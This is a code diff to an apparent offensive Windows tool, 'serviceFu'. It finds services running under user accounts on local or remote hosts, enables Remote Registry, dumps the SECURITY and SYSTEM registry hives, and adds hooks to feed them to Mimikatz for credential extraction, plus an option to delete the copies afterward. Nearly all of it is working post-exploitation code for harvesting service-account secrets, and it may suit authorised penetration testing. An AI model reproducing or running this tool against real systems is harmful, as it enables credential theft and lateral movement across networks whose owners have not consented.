@@ -7,26 +7,33 @@
 #include <algorithm>
 #include <stdlib.h>
 #include <winreg.h>
+#include <fstream>
 
 #include "getopt.h"
 #include "debug.h"
 #include "utils.h"
 
+#ifdef MIMIKATZLIB
+#include "lsadumpsecrets.h"
+#endif
+
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Advapi32.lib")
 
-typedef NTSTATUS(NTAPI *_NtSaveKey)(
-	HANDLE KeyHandle,
-	HANDLE FileHandle
-	);
+#ifdef MIMIKATZLIB
+	#ifdef _DEBUG
+		#pragma comment(lib, "LsadumpSecrets_Debug.lib")
+	#else
+		#pragma comment(lib, "LsadumpSecrets_Release.lib")
+	#endif
+#endif
 
-PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName) {
-	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
-}
+std::set<std::string> ignored;
 
-std::vector<std::string> ignored;
-
-bool searchVector(std::string str)
+/**
+ * searchIgnored - search global ignored container for occurence of string
+ */
+bool searchIgnored(std::string str)
 {
 	for(std::string s : ignored) {
 		if(s.compare(str) == 0)
@@ -36,7 +43,11 @@ bool searchVector(std::string str)
 	return false;
 }
 
-std::vector<std::string> EnumerateAllServices(SC_HANDLE hSCM) {
+/**
+ * find_interesting_services - find occurences of services which run using context
+ *	of user account not in ignored list.
+ */
+std::vector<std::string> find_interesting_services(SC_HANDLE hSCM) {
 	std::vector<std::string> svc;
 	void* buf = NULL;
 	DWORD bufSize = 0;
@@ -67,7 +78,7 @@ std::vector<std::string> EnumerateAllServices(SC_HANDLE hSCM) {
 							std::string str(config->lpServiceStartName);
 							std::transform(str.begin(), str.end(), str.begin(), ::tolower);
 							//test.insert(s);
-							if(!searchVector(str))
+							if(!searchIgnored(str))
 								svc.push_back(str);
 							break;
 						}
@@ -257,8 +268,24 @@ std::vector<std::string> translate_targets(std::string input_hosts)
 	return hosts;
 }
 
-void save_local_reg_hive(std::string destDir)
+void parse_ignore_file(std::string inputFile)
 {
+	std::ifstream inFile(inputFile);
+	std::string line;
+
+	while(std::getline(inFile, line)) {
+		//make it lowercase
+		std::transform(line.begin(), line.end(), line.begin(), ::tolower);
+
+		//add to ignore list
+		ignored.insert(line);
+	}
+}
+
+std::vector<std::string> save_local_reg_hive(std::string destDir)
+{
+	std::vector<std::string> savedFiles;
+
 	//Security hive
 	HKEY securityHive;
 	LONG ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Security", 0, 0x20000, &securityHive);
@@ -268,6 +295,9 @@ void save_local_reg_hive(std::string destDir)
 		ret = RegSaveKeyA(securityHive, filepath.c_str(), NULL);
 		if(ret != ERROR_SUCCESS) {
 			printf("error RegSaveKeyA: %s, %s\n", filepath.c_str(), GetLastErrorAsString(ret).c_str());
+		}
+		else {
+			savedFiles.push_back(filepath);
 		}
 
 		RegCloseKey(securityHive);
@@ -286,16 +316,23 @@ void save_local_reg_hive(std::string destDir)
 		if(ret != ERROR_SUCCESS) {
 			printf("error RegSaveKeyA: %s, %s\n", filepath.c_str(), GetLastErrorAsString(ret).c_str());
 		}
+		else {
+			savedFiles.push_back(filepath);
+		}
 
 		RegCloseKey(systemHive);
 	}
 	else {
 		printf("error RegOpenKeyA: HKEY_LOCAL_MACHINE\\SYSTEM %s\n", GetLastErrorAsString(ret).c_str());
 	}
+
+	return savedFiles;
 }
 
-void save_remote_reg_hive(std::string target, std::string destDir)
+std::vector<std::string> save_remote_reg_hive(std::string target, std::string destDir)
 {
+	std::vector<std::string> savedFiles;
+
 	std::string SecurityHiveStr = target + "_Security.hiv";
 	std::string SystemHiveStr = target + "_System.hiv";
 	std::string conn = "\\\\" + target;
@@ -316,8 +353,13 @@ void save_remote_reg_hive(std::string target, std::string destDir)
 				filePathLocal = destDir + "\\" + SecurityHiveStr;
 
 				BOOL ret2 = MoveFileA(filePathRemote.c_str(), filePathLocal.c_str());
-				if(ret2 == FALSE)
+				if(ret2 == FALSE) {
 					printf("error MoveFileA %s: %s\n", filePathRemote.c_str(), GetLastErrorAsString(GetLastError()).c_str());
+					DeleteFileA(filePathRemote.c_str());
+				}
+				else {
+					savedFiles.push_back(filePathLocal);
+				}
 			}
 			else {
 				printf("error RegSaveKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(GetLastError()).c_str());
@@ -339,8 +381,13 @@ void save_remote_reg_hive(std::string target, std::string destDir)
 				filePathLocal = destDir + "\\" + SystemHiveStr;
 
 				BOOL ret2 = MoveFileA(filePathRemote.c_str(), filePathLocal.c_str());
-				if(ret2 == FALSE)
+				if(ret2 == FALSE) {
 					printf("error MoveFileA %s: %s\n", filePathRemote.c_str(), GetLastErrorAsString(GetLastError()).c_str());
+					DeleteFileA(filePathRemote.c_str());
+				}
+				else {
+					savedFiles.push_back(filePathLocal);
+				}
 			}
 			else {
 				printf("error RegSaveKeyA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
@@ -357,6 +404,8 @@ void save_remote_reg_hive(std::string target, std::string destDir)
 	else {
 		printf("error RegConnectRegistryA %s: %s\n", target.c_str(), GetLastErrorAsString(ret).c_str());
 	}
+
+	return savedFiles;
 }
 
 void start_remote_registry_svc(SC_HANDLE sc, std::string target)
@@ -377,14 +426,18 @@ void start_remote_registry_svc(SC_HANDLE sc, std::string target)
 	}
 }
 
-void svcfu(std::vector<std::string> targets, std::string destDir)
+void svcfu(std::vector<std::string> targets, std::string destDir, bool forceSave, bool saveReg, bool delReg, bool runMimikatz)
 {
 	bool local = true;
+	
+	//adjust process privilege
 	addPrivilegeToCurrentProcess("SeBackupPrivilege");
 
+	//for every target specified
 	for(std::string target : targets) {
 		SC_HANDLE sc = NULL;
 
+		//if no targets given default to localhost
 		const char* targetStr = NULL;
 		if(target.length() != 0) {
 			printf("Machine: %s\n", target.c_str());
@@ -395,26 +448,50 @@ void svcfu(std::vector<std::string> targets, std::string destDir)
 			printf("Machine: localhost\n");
 		}
 		
+		//open service control manager
 		sc = OpenSCManagerA(targetStr, NULL, SC_MANAGER_ENUMERATE_SERVICE);
-
 		if(sc == NULL) {
 			printf("error OpenSCManager: %s\n", GetLastErrorAsString(GetLastError()).c_str());
 			return;
 		}
 
-		std::vector<std::string> all = EnumerateAllServices(sc);
+		//find all the interesting services
+		std::vector<std::string> all = find_interesting_services(sc);
 		printf("\tInteresting services count: %d\n", all.size());
 		for(std::string svc : all) {
 			printf("\t\t%s\n", svc.c_str());
 		}
 
-		if(all.size() == 0) { //TOOD change this to > 0 when not testing
-			if(local) {
-				save_local_reg_hive(destDir);
+		//post processing logic (registry save, mimikatz, and cleanup)
+		std::vector<std::string> savedFiles;
+		if(saveReg) {
+			//if interesting service found or force flag set
+			if(all.size() > 0 || forceSave) {
+				
+				//Save registry hives for getting credentials
+				if(local) {
+					savedFiles = save_local_reg_hive(destDir);
+				}
+				else {
+					start_remote_registry_svc(sc, target);
+					savedFiles = save_remote_reg_hive(target, destDir);
+				}
 			}
-			else {
-				start_remote_registry_svc(sc, target);
-				save_remote_reg_hive(target, destDir);
+
+			if(runMimikatz) {
+				//use mimikatz to obtain credentials
+#ifdef MIMIKATZLIB
+				//TODO integrate lsadumpsecrets code to be called here
+#else
+				printf("[-] Mimikatz support not compiled in. Rebuild\n");
+#endif
+			}
+
+			if(delReg) {
+				//delete registry hive files
+				for(std::string file : savedFiles) {
+					DeleteFileA(file.c_str());
+				}
 			}
 		}
 
@@ -427,20 +504,27 @@ void usage()
 {
 	printf("serviceFu - Find interesting services\n");
 	printf("Usage:\n");
-	printf("h              help - show this help message\n");
-	printf("v num          verbosity - level of displayed information\n");
-	printf("t targets      target(s) - target computer(s) (defaul localhost). Accepts ranges and comma separated entries\n");
-	printf("o directory    output directory - directory to write registry hives\n");
+	printf("   h              help - show this help message\n");
+	printf("   v num          verbosity - level of displayed information\n");
+	printf("   t targets      target(s) - target computer(s) (defaul localhost). Accepts ranges and comma separated entries\n");
+	printf("   o directory    output directory - directory to write registry hives\n");
+	printf("   i file         ignore - user accounts to ignore from results\n");
+	printf("   m              mimikatz - automatically use mimikatz to find creds\n");
+	printf("   d              delete - delete registry hive files after mimikatz run\n");
+	printf("   r              registry - grab registry hives if interesting services discovered\n");
 }
 
+/**
+ * initialize - initialize ignored container with default account names
+ */
 void initialize()
 {
-	ignored.push_back("");
-	ignored.push_back("localsystem");
-	ignored.push_back("nt authority\\localservice");
-	ignored.push_back("nt authority\\networkservice");
-	ignored.push_back("nt authority\\localservice");
-	ignored.push_back("nt authority\\system");
+	ignored.insert("");
+	ignored.insert("localsystem");
+	ignored.insert("nt authority\\localservice");
+	ignored.insert("nt authority\\networkservice");
+	ignored.insert("nt authority\\localservice");
+	ignored.insert("nt authority\\system");
 }
 
 int main(int argc, char** argv)
@@ -449,13 +533,18 @@ int main(int argc, char** argv)
 
 	char* targetsInput = NULL;
 	char* outputDir = NULL;
+	char* ignoreFile = NULL;
+	bool runMimikatz = false;
+	bool delReg = false;
+	bool saveReg = false;
+	bool forceSave = false;
 
 	//argument parsing
 	int c = 0;
-	while((c = getopt(argc, argv, "hv:t:o:")) != -1) {
+	while((c = getopt(argc, argv, "hv:t:o:i:mdrf")) != -1) {
 		switch(c) {
 		case 'h':
-			//usage();
+			usage();
 			break;
 		case 'v':
 			verbosity = atoi(optarg); //TODO unsafe..fix this
@@ -465,6 +554,22 @@ int main(int argc, char** argv)
 			break;
 		case 'o':
 			outputDir = optarg;
+			break;
+		case 'i':
+			ignoreFile = optarg;
+			break;
+		case 'm':
+			runMimikatz = true;
+			delReg = true;
+			break;
+		case 'd':
+			delReg = true;
+			break;
+		case 'r':
+			saveReg = true;
+			break;
+		case 'f':
+			forceSave = true;
 			break;
 		case '?':
 			printf("\n[-] Unrecognized option: %c\n\n", c);
@@ -477,7 +582,12 @@ int main(int argc, char** argv)
 		}
 	}
 
-	//parse input targets
+	//pares user input: ignore accounts
+	if(ignoreFile) {
+		parse_ignore_file(std::string(ignoreFile));
+	}
+
+	//parse user input: targets
 	std::vector<std::string> targets;
 	if(targetsInput != NULL) {
 		targets = translate_targets(std::string(targetsInput));
@@ -486,7 +596,7 @@ int main(int argc, char** argv)
 		targets.push_back(std::string());
 	}
 
-	//parse input directory
+	//parse user input: output directory
 	std::string destDir;
 	if(outputDir)
 		destDir = std::string(outputDir);
@@ -498,7 +608,8 @@ int main(int argc, char** argv)
 		}
 	}
 
-	svcfu(targets, destDir);
+	//main logic function
+	svcfu(targets, destDir, forceSave, saveReg, delReg, runMimikatz);
 
 	return 0;
 }
